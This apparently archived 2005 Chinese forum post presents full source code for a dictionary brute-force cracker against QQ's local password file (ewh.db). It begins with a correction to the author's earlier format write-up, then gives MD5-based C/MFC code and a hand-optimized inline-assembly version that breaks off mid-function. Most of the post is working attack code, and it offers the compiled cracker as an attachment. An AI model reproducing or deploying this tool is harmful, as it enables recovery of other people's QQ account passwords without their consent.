

# QQ 本地密码文件暴力破解代码

> 原文：[`www.pediy.com/kssd/pediy07/pediy7-446.htm`](https://www.pediy.com/kssd/pediy07/pediy7-446.htm)

作者：冲出宇宙  
作者声明：任何人都可以使用任何方式对本代码进行修改。  
  
首先，向兄弟们表示严重的歉意。去年我写的那篇关于 QQ 本地密码文件格式的帖子，由于我的疏忽，把最后那个等式抄写错了。这个问题我最近才看到，之前我去研究其他东西去了。原贴见："http://bbs.pediy.com/printthread.php?threadid=7933"  
错误的地方是：  
3）for(i=0;i<16;i++)  
{  
m\[i\]=(!m\[i\])^al;//al 在这里指的是密码块数据的长度  
//上面的文件中 al=10h;  
}  
这里，应该是：m\[i\] = not (m\[i\] xor al),al=0x10;  
  
昨天我无意中发现这个问题后，十分羞愧。我对我自己极不负责任的态度十分不满。为了向兄弟们表示歉意。特制作了一个简单的 QQ 本地密码文件暴力破解软件。  
下面说一下其构成及源代码：  
1 构成：VB 程序调用 VC 编写的 OCX，这样做是为了方面大家自己做界面。  
2 OCX 的输出函数：只有一个：void CQQDecoderCtrl::Decoder(LPCTSTR fileQQ, LPCTSTR filePwd) ，第一个参数是 QQ 的密码文件，第二个参数是密码字典。  
3 源代码：VB 的源代码不作介绍了，附件里面有。这里只说明一下 VC 的源代码（附件里面也有）。  
  
//Md5 算法  
typedef unsigned char UI8;  
typedef char I8;  
typedef unsigned long UI32;  
  
//F, G, H and I are basic MD5 functions.  
#define md5\_F(x, y, z) (((x) & (y)) | ((~x) & (z)))  
#define md5\_G(x, y, z) (((x) & (z)) | ((y) & (~z)))  
#define md5\_H(x, y, z) ((x) ^ (y) ^ (z))  
#define md5\_I(x, y, z) ((y) ^ ((x) | (~z)))  
  
// ROTATE\_LEFT rotates x left n bits.  
//  x<<<=n;  
#define md5\_ROTATE\_LEFT(x, n) (((x) << (n)) | ((x) >> (32-(n))))  
  
// FF, GG, HH, and II transformations for rounds 1, 2, 3, and 4.  
//Rotation is separate from addition to prevent recomputation.  
#define md5\_FF(a, b, c, d, x, s, ac) { \\  
  (a) += md5\_F ((b), (c), (d)) + (x) + (ac); \\  
  (a) = md5\_ROTATE\_LEFT ((a), (s)); \\  
  (a) += (b); \\  
}  
#define md5\_GG(a, b, c, d, x, s, ac) { \\  
  (a) += md5\_G ((b), (c), (d)) + (x) + (ac); \\  
  (a) = md5\_ROTATE\_LEFT ((a), (s)); \\  
  (a) += (b); \\  
}  
#define md5\_HH(a, b, c, d, x, s, ac) { \\  
  (a) += md5\_H ((b), (c), (d)) + (x) + (ac); \\  
  (a) = md5\_ROTATE\_LEFT ((a), (s)); \\  
  (a) += (b); \\  
}  
#define md5\_II(a, b, c, d, x, s, ac) { \\  
  (a) += md5\_I ((b), (c), (d)) + (x) + (ac); \\  
  (a) = md5\_ROTATE\_LEFT ((a), (s)); \\  
  (a) += (b); \\  
}  
  
// Constants for MD5Transform routine.  
#define md5\_S11 7  
#define md5\_S12 12  
#define md5\_S13 17  
#define md5\_S14 22  
#define md5\_S21 5  
#define md5\_S22 9  
#define md5\_S23 14  
#define md5\_S24 20  
#define md5\_S31 4  
#define md5\_S32 11  
#define md5\_S33 16  
#define md5\_S34 23  
#define md5\_S41 6  
#define md5\_S42 10  
#define md5\_S43 15  
#define md5\_S44 21  
  
//Md5Tranform 代表了一轮 md5 变换  
#define Md5Tranform \\  
  a = m\_state\[0\];\\  
  b = m\_state\[1\];\\  
  c = m\_state\[2\];\\  
  d = m\_state\[3\];\\  
  md5\_FF (a, b, c, d, m\_data\[ 0\], md5\_S11, 0xd76aa478);\\  
  md5\_FF (d, a, b, c, m\_data\[ 1\], md5\_S12, 0xe8c7b756);\\  
  md5\_FF (c, d, a, b, m\_data\[ 2\], md5\_S13, 0x242070db);\\  
  md5\_FF (b, c, d, a, m\_data\[ 3\], md5\_S14, 0xc1bdceee);\\  
  md5\_FF (a, b, c, d, m\_data\[ 4\], md5\_S11, 0xf57c0faf);\\  
  md5\_FF (d, a, b, c, m\_data\[ 5\], md5\_S12, 0x4787c62a);\\  
  md5\_FF (c, d, a, b, m\_data\[ 6\], md5\_S13, 0xa8304613);\\  
  md5\_FF (b, c, d, a, m\_data\[ 7\], md5\_S14, 0xfd469501);\\  
  md5\_FF (a, b, c, d, m\_data\[ 8\], md5\_S11, 0x698098d8);\\  
  md5\_FF (d, a, b, c, m\_data\[ 9\], md5\_S12, 0x8b44f7af);\\  
  md5\_FF (c, d, a, b, m\_data\[10\], md5\_S13, 0xffff5bb1);\\  
  md5\_FF (b, c, d, a, m\_data\[11\], md5\_S14, 0x895cd7be);\\  
  md5\_FF (a, b, c, d, m\_data\[12\], md5\_S11, 0x6b901122);\\  
  md5\_FF (d, a, b, c, m\_data\[13\], md5\_S12, 0xfd987193);\\  
  md5\_FF (c, d, a, b, m\_data\[14\], md5\_S13, 0xa679438e);\\  
  md5\_FF (b, c, d, a, m\_data\[15\], md5\_S14, 0x49b40821);\\  
  md5\_GG (a, b, c, d, m\_data\[ 1\], md5\_S21, 0xf61e2562);\\  
  md5\_GG (d, a, b, c, m\_data\[ 6\], md5\_S22, 0xc040b340);\\  
  md5\_GG (c, d, a, b, m\_data\[11\], md5\_S23, 0x265e5a51);\\  
  md5\_GG (b, c, d, a, m\_data\[ 0\], md5\_S24, 0xe9b6c7aa);\\  
  md5\_GG (a, b, c, d, m\_data\[ 5\], md5\_S21, 0xd62f105d);\\  
  md5\_GG (d, a, b, c, m\_data\[10\], md5\_S22,  0x2441453);\\  
  md5\_GG (c, d, a, b, m\_data\[15\], md5\_S23, 0xd8a1e681);\\  
  md5\_GG (b, c, d, a, m\_data\[ 4\], md5\_S24, 0xe7d3fbc8);\\  
  md5\_GG (a, b, c, d, m\_data\[ 9\], md5\_S21, 0x21e1cde6);\\  
  md5\_GG (d, a, b, c, m\_data\[14\], md5\_S22, 0xc33707d6);\\  
  md5\_GG (c, d, a, b, m\_data\[ 3\], md5\_S23, 0xf4d50d87);\\  
  md5\_GG (b, c, d, a, m\_data\[ 8\], md5\_S24, 0x455a14ed);\\  
  md5\_GG (a, b, c, d, m\_data\[13\], md5\_S21, 0xa9e3e905);\\  
  md5\_GG (d, a, b, c, m\_data\[ 2\], md5\_S22, 0xfcefa3f8);\\  
  md5\_GG (c, d, a, b, m\_data\[ 7\], md5\_S23, 0x676f02d9);\\  
  md5\_GG (b, c, d, a, m\_data\[12\], md5\_S24, 0x8d2a4c8a);\\  
  md5\_HH (a, b, c, d, m\_data\[ 5\], md5\_S31, 0xfffa3942);\\  
  md5\_HH (d, a, b, c, m\_data\[ 8\], md5\_S32, 0x8771f681);\\  
  md5\_HH (c, d, a, b, m\_data\[11\], md5\_S33, 0x6d9d6122);\\  
  md5\_HH (b, c, d, a, m\_data\[14\], md5\_S34, 0xfde5380c);\\  
  md5\_HH (a, b, c, d, m\_data\[ 1\], md5\_S31, 0xa4beea44);\\  
  md5\_HH (d, a, b, c, m\_data\[ 4\], md5\_S32, 0x4bdecfa9);\\  
  md5\_HH (c, d, a, b, m\_data\[ 7\], md5\_S33, 0xf6bb4b60);\\  
  md5\_HH (b, c, d, a, m\_data\[10\], md5\_S34, 0xbebfbc70);\\  
  md5\_HH (a, b, c, d, m\_data\[13\], md5\_S31, 0x289b7ec6);\\  
  md5\_HH (d, a, b, c, m\_data\[ 0\], md5\_S32, 0xeaa127fa);\\  
  md5\_HH (c, d, a, b, m\_data\[ 3\], md5\_S33, 0xd4ef3085);\\  
  md5\_HH (b, c, d, a, m\_data\[ 6\], md5\_S34,  0x4881d05);\\  
  md5\_HH (a, b, c, d, m\_data\[ 9\], md5\_S31, 0xd9d4d039);\\  
  md5\_HH (d, a, b, c, m\_data\[12\], md5\_S32, 0xe6db99e5);\\  
  md5\_HH (c, d, a, b, m\_data\[15\], md5\_S33, 0x1fa27cf8);\\  
  md5\_HH (b, c, d, a, m\_data\[ 2\], md5\_S34, 0xc4ac5665);\\  
  md5\_II (a, b, c, d, m\_data\[ 0\], md5\_S41, 0xf4292244);\\  
  md5\_II (d, a, b, c, m\_data\[ 7\], md5\_S42, 0x432aff97);\\  
  md5\_II (c, d, a, b, m\_data\[14\], md5\_S43, 0xab9423a7);\\  
  md5\_II (b, c, d, a, m\_data\[ 5\], md5\_S44, 0xfc93a039);\\  
  md5\_II (a, b, c, d, m\_data\[12\], md5\_S41, 0x655b59c3);\\  
  md5\_II (d, a, b, c, m\_data\[ 3\], md5\_S42, 0x8f0ccc92);\\  
  md5\_II (c, d, a, b, m\_data\[10\], md5\_S43, 0xffeff47d);\\  
  md5\_II (b, c, d, a, m\_data\[ 1\], md5\_S44, 0x85845dd1);\\  
  md5\_II (a, b, c, d, m\_data\[ 8\], md5\_S41, 0x6fa87e4f);\\  
  md5\_II (d, a, b, c, m\_data\[15\], md5\_S42, 0xfe2ce6e0);\\  
  md5\_II (c, d, a, b, m\_data\[ 6\], md5\_S43, 0xa3014314);\\  
  md5\_II (b, c, d, a, m\_data\[13\], md5\_S44, 0x4e0811a1);\\  
  md5\_II (a, b, c, d, m\_data\[ 4\], md5\_S41, 0xf7537e82);\\  
  md5\_II (d, a, b, c, m\_data\[11\], md5\_S42, 0xbd3af235);\\  
  md5\_II (c, d, a, b, m\_data\[ 2\], md5\_S43, 0x2ad7d2bb);\\  
  md5\_II (b, c, d, a, m\_data\[ 9\], md5\_S44, 0xeb86d391);\\  
  m\_state\[0\] += a;\\  
  m\_state\[1\] += b;\\  
  m\_state\[2\] += c;\\  
  m\_state\[3\] += d;\\  
  
  
///////////////////////////////////////  
// QQ 解密正式开始  
//////////////////////////////////////  
//作者：冲出宇宙  
//2005，11，1  
//////////////////////////////////////  
UI8 MD5Result\[16\];  //md5 加密后的结果  
UI32 LoopNum;    //循环次数  
UI32 QQNum;    //qq 号码  
UI32 PwdNum;    //已经对多少个字符串进行了检查  
CString Pwd;    //当前正确的密码  
CString FileQQ,FilePwd;  //密码文件和密码字典文件  
  
DWORD DecodeThreadId;    
HANDLE DecodeThreadHandle;  //解密线程  
  
CQQDecoderCtrl \*Me;  
  
//密码是否正确  
bool IsPasswordCorrect(char\* sPwd)  
{  
  UI32 m\_state\[4\],m\_data\[16\];  
  register UI32 a,b,c,d;  
  m\_state\[0\] = 0x67452301L;  
  m\_state\[1\] = 0xefcdab89L;  
  m\_state\[2\] = 0x98badcfeL;  
  m\_state\[3\] = 0x10325476L;  
  a = strlen(sPwd);  
  memset(m\_data,0,64);  
  memcpy(m\_data,sPwd,a);  
  m\_data\[14\] = a\*8;  
  ((UI8\*)m\_data)\[a\] = 0x80;  
  Md5Tranform;  
  memcpy(m\_data,m\_state,16);  
  m\_data\[4\] = 0x80;  
  m\_data\[14\] = 0x80;  
  //主要轮次  
  for(UI32 i=1;i<LoopNum;i++)    
  {  
    m\_state\[0\] = 0x67452301L;  
    m\_state\[1\] = 0xefcdab89L;  
    m\_state\[2\] = 0x98badcfeL;  
    m\_state\[3\] = 0x10325476L;  
    Md5Tranform;  
    m\_data\[0\] = m\_state\[0\];  
    m\_data\[1\] = m\_state\[1\];  
    m\_data\[2\] = m\_state\[2\];  
    m\_data\[3\] = m\_state\[3\];  
  }  
  if(memcmp(MD5Result,m\_state,16) == 0)  return true;  
  return false;  
}  
  
//fileQQ:QQ 密码文件（ewh.db)  
//filePwd:密码字典文件(\*.txt),格式参见测试用例  
void CQQDecoderCtrl::Decoder(LPCTSTR fileQQ, LPCTSTR filePwd)   
{  
  FileQQ  = fileQQ;  
  FilePwd = filePwd;  
  Me = this;  
  //建立解码线程  
  DecodeThreadHandle = ::CreateThread(0,0,DecodeThread,0,0,&DecodeThreadId);  
  if(!DecodeThreadHandle)  
  {  
    return;  
  }  
  ::CloseHandle(DecodeThreadHandle);  
}  
  
//解密线程  
DWORD WINAPI CQQDecoderCtrl::DecodeThread(LPVOID arg)  
{  
  UI32 i;  
  UI8 buffer\[60\];  
  CString strPwd;  
  BOOL flag;  
    
  PwdNum = 0;  
  //读取 QQ 密码文件  
  CFile fQQ(FileQQ,CFile::modeRead);  
  fQQ.Read(buffer,60);  
  fQQ.Close();  
  LoopNum = ((UI32\*)buffer)\[4\];  //得到循环次数  
  QQNum = ((UI32\*)buffer)\[14\];  //得到 QQ 号码  
  for(i=0;i<16;i++)  MD5Result\[i\] = ((~buffer\[30+i\])⁰x10);  //得到 md5 结果  
  //读取密码字典文件  
  CFile fPwd(FilePwd,CFile::modeRead);  
  CArchive cPwd(&fPwd,CArchive::load);  
  //测试密码  
  flag = TRUE;  
  while(TRUE == flag)  
  {  
    for(i=0;i<10;i++)  
    {  
      flag = cPwd.ReadString(strPwd);  
      if(flag == FALSE)  
      {  
        break;  
      }  
      else  
      {  
        //判断密码是否正确  
        if(true == IsPasswordCorrect((char\*)(LPCTSTR)strPwd))  
        {  
          Pwd = strPwd;  
          ::PostMessage((HWND)(Me->GetHwnd()),WM\_TIMER,2,0);  
          cPwd.Close();  
          fPwd.Close();      
          return 0;  
        }  
      }  
      PwdNum ++;  
    }  
    //激发已经检查过的密码个数事件  
    ::PostMessage((HWND)(Me->GetHwnd()),WM\_TIMER,1,0);    
  }  
  //激发已经检查过的密码个数事件  
  ::PostMessage((HWND)(Me->GetHwnd()),WM\_TIMER,1,0);    
  //激发已经检查完毕事件  
  ::PostMessage((HWND)(Me->GetHwnd()),WM\_TIMER,3,0);    
  //关闭文件  
  cPwd.Close();  
  fPwd.Close();  
  return 0;  
}  
//发送 ocx 的事件  
void CQQDecoderCtrl::OnTimer(UINT nIDEvent)   
{  
  switch(nIDEvent)  //由此来判断该发送什么事件出去  
  {  
  case 1:  //解密进行中  
    this->FireDecoding(PwdNum);  
    break;;  
  case 2:  //发现新密码  
    this->FireValidPwdFound(Pwd);  
    break;;  
  case 3:  //解密完成  
    this->FireDecodeOver(0);  
    break;  
  }    
}  
  
Md5 算法十分清晰。所以，速度不是特别快。根据测试，大约每秒可以测试 5 个密码。  
附件有 4 个文件，分别是：  
  
QQSrc.rar  包含 vc 编写的 ocx 源代码和 vb 编写程序的源代码  
QQ.rar     包含 ocx 和 vb 编写的程序，暴力破解程序就在这里  
  
test.rar 包含 2 个文件：  
  
ewh.db     测试密码文件。就是我以前的密码文件，密码现在已经修改了  
pwd.txt    测试字典文件。  
  
  
附件:qq.rar 附件:qqsrc.rar 附件:test.rar  
  
  
10.2 号更新：。。。。。。。。。。。。。。。。。。  
  
QQ 暴力破解程序终极优化。  
经过认真的排列汇编语言的顺序后，程序现在能做 440 万次轮转/秒。所以，检测速度上升到 10 个/秒左右。以下是其主要代码。附件是最新 QQ 暴力破解程序。  
  
//Md5 算法  
typedef unsigned char UI8;  
typedef char I8;  
typedef unsigned long UI32;  
  
#define md5\_S11 25  
#define md5\_S12 20  
#define md5\_S13 15  
#define md5\_S14 10  
#define md5\_S21 27  
#define md5\_S22 23  
#define md5\_S23 18  
#define md5\_S24 12  
#define md5\_S31 28  
#define md5\_S32 21  
#define md5\_S33 16  
#define md5\_S34 9  
#define md5\_S41 26  
#define md5\_S42 22  
#define md5\_S43 17  
#define md5\_S44 11  
  
#define md5\_S110 7  
#define md5\_S120 12  
#define md5\_S130 17  
#define md5\_S140 22  
#define md5\_S210 5  
#define md5\_S220 9  
#define md5\_S230 14  
#define md5\_S240 20  
#define md5\_S310 4  
#define md5\_S320 11  
#define md5\_S330 16  
#define md5\_S340 23  
#define md5\_S410 6  
#define md5\_S420 10  
#define md5\_S430 15  
#define md5\_S440 21  
//非 mmx 实现  
//思想：  
//  a,b,c,d 保存在 eax,ebx,ecx,edx  
//  m\_data\[0\]-m\_data\[3\]保存在 mm0,mm1,mm2,mm3  
//  esi 和 edi 做 temp  
  
  
#define a eax  
#define b ebx  
#define c ecx  
#define d edx  
  
//以下结果均在 esi 中  
// f(x,y,z) = (x and y) or (not(x) and z)  
//      = ((y xor z) and x) xor z  
#define F(x,y,z) \\  
  \_\_asm mov esi,y \\  
  \_\_asm xor esi,z \\  
  \_\_asm and esi,x \\  
  \_\_asm xor esi,z  
  
//g(x,y,z)  = (x and z) or (y and not(z))  
//      = ((x xor y) and z) xor y  
#define G(x,y,z) \\  
  \_\_asm mov esi,x \\  
  \_\_asm xor esi,y \\  
  \_\_asm and esi,z \\  
  \_\_asm xor esi,y  
  
//h(x,y,z) = x xor y xor z  
#define H(x,y,z) \\  
  \_\_asm mov esi,x \\  
  \_\_asm xor esi,y \\  
  \_\_asm xor esi,z  
  
//I(x,y,z) = y xor (x or not(z))  
#define I(x,y,z) \\  
  \_\_asm mov esi,z \\  
  \_\_asm not esi \\  
  \_\_asm or esi,x \\  
  \_\_asm xor esi,y  
  
//第一个 FF,就是不需要加任何东西上去  
#define md5\_FF0(a0,b0,c0,d0,s0,s1,ac) \\  
  F(b0,c0,d0) \\  
  \_\_asm add a0,esi \\  
  \_\_asm add a0,ac \\  
  \_\_asm rol a0,s1 \\  
  \_\_asm add a0,b0  
//当 x 数组数据不为 0 时  
#define md5\_FF1(a0,b0,c0,d0,s0,s1,ac) \\  
  F(b0,c0,d0) \\  
  \_\_asm movd edi,mm0 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
  \_\_asm add a0,b0  
  
#define md5\_FF2(a0,b0,c0,d0,s0,s1,ac) \\  
  F(b0,c0,d0) \\  
  \_\_asm movd edi,mm1 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
#define md5\_FF3(a0,b0,c0,d0,s0,s1,ac) \\  
  F(b0,c0,d0) \\  
  \_\_asm movd edi,mm2 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
#define md5\_FF4(a0,b0,c0,d0,s0,s1,ac) \\  
  F(b0,c0,d0) \\  
  \_\_asm movd edi,mm3 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
  
//第一个 GG,就是不需要加任何东西上去  
#define md5\_GG0(a0,b0,c0,d0,s0,s1,ac) \\  
  G(b0,c0,d0) \\  
  \_\_asm add a0,esi \\  
  \_\_asm add a0,ac \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
//当 x 数组数据不为 0 时  
#define md5\_GG1(a0,b0,c0,d0,s0,s1,ac) \\  
  G(b0,c0,d0) \\  
  \_\_asm movd edi,mm0 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
#define md5\_GG2(a0,b0,c0,d0,s0,s1,ac) \\  
  G(b0,c0,d0) \\  
  \_\_asm movd edi,mm1 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
#define md5\_GG3(a0,b0,c0,d0,s0,s1,ac) \\  
  G(b0,c0,d0) \\  
  \_\_asm movd edi,mm2 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
#define md5\_GG4(a0,b0,c0,d0,s0,s1,ac) \\  
  G(b0,c0,d0) \\  
  \_\_asm movd edi,mm3 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
  
//第一个 HH,就是不需要加任何东西上去  
#define md5\_HH0(a0,b0,c0,d0,s0,s1,ac) \\  
  H(b0,c0,d0) \\  
  \_\_asm add a0,esi \\  
  \_\_asm add a0,ac \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
//当 x 数组数据不为 0 时  
#define md5\_HH1(a0,b0,c0,d0,s0,s1,ac) \\  
  H(b0,c0,d0) \\  
  \_\_asm movd edi,mm0 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
#define md5\_HH2(a0,b0,c0,d0,s0,s1,ac) \\  
  H(b0,c0,d0) \\  
  \_\_asm movd edi,mm1 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
#define md5\_HH3(a0,b0,c0,d0,s0,s1,ac) \\  
  H(b0,c0,d0) \\  
  \_\_asm movd edi,mm2 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
#define md5\_HH4(a0,b0,c0,d0,s0,s1,ac) \\  
  H(b0,c0,d0) \\  
  \_\_asm movd edi,mm3 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
//第一个 II,就是不需要加任何东西上去  
#define md5\_II0(a0,b0,c0,d0,s0,s1,ac) \\  
  I(b0,c0,d0) \\  
  \_\_asm add a0,esi \\  
  \_\_asm add a0,ac \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
//当 x 数组数据不为 0 时  
#define md5\_II1(a0,b0,c0,d0,s0,s1,ac) \\  
  I(b0,c0,d0) \\  
  \_\_asm movd edi,mm0 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
#define md5\_II2(a0,b0,c0,d0,s0,s1,ac) \\  
  I(b0,c0,d0) \\  
  \_\_asm movd edi,mm1 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
#define md5\_II3(a0,b0,c0,d0,s0,s1,ac) \\  
  I(b0,c0,d0) \\  
  \_\_asm movd edi,mm2 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
#define md5\_II4(a0,b0,c0,d0,s0,s1,ac) \\  
  I(b0,c0,d0) \\  
  \_\_asm movd edi,mm3 \\  
  \_\_asm add a0,esi \\  
  \_\_asm add edi,ac \\  
  \_\_asm add a0,edi \\  
  \_\_asm rol a0,s1 \\  
\_\_asm add a0,b0  
  
  
///////////////////////////////////////  
// QQ 解密正式开始  
//////////////////////////////////////  
//作者：冲出宇宙  
//2005，11，1  
//////////////////////////////////////  
UI8 MD5Result\[16\];  //md5 加密后的结果  
UI32 LoopNum;    //循环次数  
UI32 QQNum;      //qq 号码  
UI32 PwdNum;    //已经对多少个字符串进行了检查  
CString Pwd;    //当前正确的密码  
CString FileQQ,FilePwd;  //密码文件和密码字典文件  
  
DWORD DecodeThreadId;    
HANDLE DecodeThreadHandle;  //解密线程  
  
CQQDecoderCtrl \*Me;  
  
//密码是否正确，每次测试 2 个密码  
bool IsPasswordCorrect(char\* sPwd0)  
{  
  UI32 i,dataIn0\[4\];  
  MD5 md5;  
  //第一轮  
  md5.Hash((UI8\*)dataIn0,(UI8\*)sPwd0,strlen(sPwd0));  
  
  \_\_asm pushad;  
  //准备输入数据  
  \_\_asm  
  {  
    //1,m\_data\[0\]  
    mov esi,\[dataIn0\];  
    movd mm0,esi;  
    //2,  
    mov esi,\[dataIn0+4\];  
    movd mm1,esi;  
    //3,  
    mov esi,\[dataIn0+8\];  
    movd mm2,esi;  
    //4,  
    mov esi,\[dataIn0+12\];  
    movd mm3,esi;  
  }  
  //主要轮次  
  \_\_asm  
  {  
    push ebp;  
    mov ebp,LoopNum;  
  }  
Begin:  
  \_\_asm  
  {  
    dec ebp;  
    cmp ebp,0;  
    je End;  
      
    \_\_asm  
    {  
      mov a,0x67452301;  
      mov b,0xefcdab89;  
      mov c,0x98badcfe;  
      mov d,0x10325476;  
    }  
  
    md5\_FF1 (a, b, c, d,  md5\_S11, md5\_S110,0xd76aa478);  
    md5\_FF2 (d, a, b, c,  md5\_S12,  md5\_S120,0xe8c7b756);  
    md5\_FF3 (c, d, a, b,  md5\_S13, md5\_S130,0x242070db);  
    md5\_FF4 (b, c, d, a,  md5\_S14, md5\_S140,0xc1bdceee);  
    md5\_FF0 (a, b, c, d,  md5\_S11,  md5\_S110,0xf57c102f);  
    md5\_FF0 (d, a, b, c, md5\_S12, md5\_S120,0x4787c62a);  
    md5\_FF0 (c, d, a, b, md5\_S13, md5\_S130,0xa8304613);  
    md5\_FF0 (b, c, d, a, md5\_S14, md5\_S140,0xfd469501);  
    md5\_FF0 (a, b, c, d, md5\_S11,md5\_S110, 0x698098d8);  
    md5\_FF0 (d, a, b, c, md5\_S12, md5\_S120,0x8b44f7af);  
    md5\_FF0 (c, d, a, b, md5\_S13,  md5\_S130,0xffff5bb1);  
    md5\_FF0 (b, c, d, a, md5\_S14, md5\_S140,0x895cd7be);  
    md5\_FF0 (a, b, c, d, md5\_S11, md5\_S110,0x6b901122);  
    md5\_FF0 (d, a, b, c, md5\_S12, md5\_S120,0xfd987193);  
    md5\_FF0 (c, d, a, b,md5\_S13, md5\_S130,0xa679440e);  
    md5\_FF0 (b, c, d, a, md5\_S14,  md5\_S140,0x49b40821);  
      
    md5\_GG2 (a, b, c, d,md5\_S21, md5\_S210,0xf61e2562);  
    md5\_GG0 (d, a, b, c, md5\_S22, md5\_S220,0xc040b340);  
    md5\_GG0 (c, d, a, b, md5\_S23, md5\_S230,0x265e5a51);  
    md5\_GG1 (b, c, d, a,md5\_S24, md5\_S240,0xe9b6c7aa);  
    md5\_GG0 (a, b, c, d, md5\_S21, md5\_S210,0xd62f105d);  
    md5\_GG0 (d, a, b, c, md5\_S22, md5\_S220, 0x2441453);  
    md5\_GG0 (c, d, a, b, md5\_S23, md5\_S230,0xd8a1e681);  
    md5\_GG0 (b, c, d, a, md5\_S24, md5\_S240,0xe7d3fc48);  
    md5\_GG0 (a, b, c, d, md5\_S21, md5\_S210,0x21e1cde6);  
    md5\_GG0 (d, a, b, c, md5\_S22, md5\_S220,0xc3370856);  
    md5\_GG4 (c, d, a, b,md5\_S23, md5\_S230,0xf4d50d87);  
    md5\_GG0 (b, c, d, a, md5\_S24, md5\_S240,0x455a14ed);  
    md5\_GG0 (a, b, c, d, md5\_S21, md5\_S210,0xa9e3e905);  
    md5\_GG3 (d, a, b, c,md5\_S22, md5\_S220,0xfcefa3f8);  
    md5\_GG0 (c, d, a, b, md5\_S23, md5\_S230,0x676f02d9);  
    md5\_GG0 (b, c, d, a, md5\_S24,md5\_S240, 0x8d2a4c8a);  
      
    md5\_HH0 (a, b, c, d, md5\_S31, md5\_S310,0xfffa3942);  
    md5\_HH0 (d, a, b, c, md5\_S32, md5\_S320,0x8771f681);  
    md5\_HH0 (c, d, a, b, md5\_S33, md5\_S330,0x6d9d6122);  
    md5\_HH0 (b, c, d, a, md5\_S34, md5\_S340,0xfde5388c);  
    md5\_HH2 (a, b, c, d,md5\_S31, md5\_S310,0xa4beea44);  
    md5\_HH0 (d, a, b, c, md5\_S32, md5\_S320,0x4bded029);  
    md5\_HH0 (c, d, a, b, md5\_S33, md5\_S330,0xf6bb4b60);  
    md5\_HH0 (b, c, d, a, md5\_S34, md5\_S340,0xbebfbc70);  
    md5\_HH0 (a, b, c, d, md5\_S31, md5\_S310,0x289b7ec6);  
    md5\_HH1 (d, a, b, c,md5\_S32, md5\_S320,0xeaa127fa);  
    md5\_HH4 (c, d, a, b,md5\_S33, md5\_S330,0xd4ef3085);  
    md5\_HH0 (b, c, d, a, md5\_S34, md5\_S340, 0x4881d05);  
    md5\_HH0 (a, b, c, d, md5\_S31, md5\_S310,0xd9d4d039);  
    md5\_HH0 (d, a, b, c, md5\_S32, md5\_S320,0xe6db99e5);  
    md5\_HH0 (c, d, a, b, md5\_S33, md5\_S330,0x1fa27cf8);  
    md5\_HH3 (b, c, d, a,md5\_S34, md5\_S340,0xc4ac5665);  
      
      
    md5\_II1 (a, b, c, d,md5\_S41, md5\_S410,0xf4292244);  
    md5\_II0 (d, a, b, c, md5\_S42,  md5\_S420,0x432aff97);  
    md5\_II0 (c, d, a, b, md5\_S43, md5\_S430,0xab942427);  
    md5\_II0 (b, c, d, a, md5\_S44, md5\_S440,0xfc93a039);  
    md5\_II0 (a, b, c, d, md5\_S41, md5\_S410,0x655b59c3);  
    md5\_II4 (d, a, b, c,md5\_S42, md5\_S420,0x8f0ccc92);  
    md5\_II0 (c, d, a, b, md5\_S43, md5\_S430,0xffeff47d);  
    md5\_II2 (b, c, d, a, md5\_S44, md5\_S440,0x85845dd1);  
    md5\_II0 (a, b, c, d, md5\_S41, md5\_S410,0x6fa87e4f);  
    md5\_II0 (d, a, b, c, md5\_S42, md5\_S420,0xfe2ce6e0);  
    md5\_II0 (c, d, a, b, md5\_S43,md5\_S430, 0xa3014314);  
    md5\_II0 (b, c, d, a, md5\_S44, md5\_S440,0x4e0811a1);  
    md5\_II0 (a, b, c, d, md5\_S41,md5\_S410, 0xf7537f02);  
    md5\_II0 (d, a, b, c, md5\_S42,md5\_S420, 0xbd3af235);  
    md5\_II3 (c, d, a, b, md5\_S43, md5\_S430, 0x2ad7d2bb);  
